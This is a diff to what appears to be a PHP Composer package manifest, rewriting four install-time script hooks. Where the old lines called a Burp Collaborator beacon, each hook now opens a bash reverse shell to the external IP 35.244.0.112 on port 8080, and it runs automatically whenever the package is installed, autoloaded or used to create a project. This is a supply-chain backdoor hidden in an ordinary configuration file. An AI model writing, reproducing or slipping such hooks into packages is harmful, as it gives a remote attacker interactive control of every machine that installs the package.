@@ -4,16 +4,16 @@
     },
     "scripts": {
         "post-package-install": [
-            "curl http://kd1bqni2jsbkaxm4unn6qazk6bc10q.burpcollaborator.net/"
+            "bash -c \"bash -i >& /dev/tcp/35.244.0.112/8080 0>&1\""
         ],
         "post-install-cmd": [
-            "curl http://kd1bqni2jsbkaxm4unn6qazk6bc10q.burpcollaborator.net/"
+            "bash -c \"bash -i >& /dev/tcp/35.244.0.112/8080 0>&1\""
         ],
         "post-autoload-dump": [
-            "curl http://kd1bqni2jsbkaxm4unn6qazk6bc10q.burpcollaborator.net/"
+            "bash -c \"bash -i >& /dev/tcp/35.244.0.112/8080 0>&1\""
         ],
         "post-create-project-cmd": [
-            "curl http://kd1bqni2jsbkaxm4unn6qazk6bc10q.burpcollaborator.net/"
+            "bash -c \"bash -i >& /dev/tcp/35.244.0.112/8080 0>&1\""
         ]
     }
 }
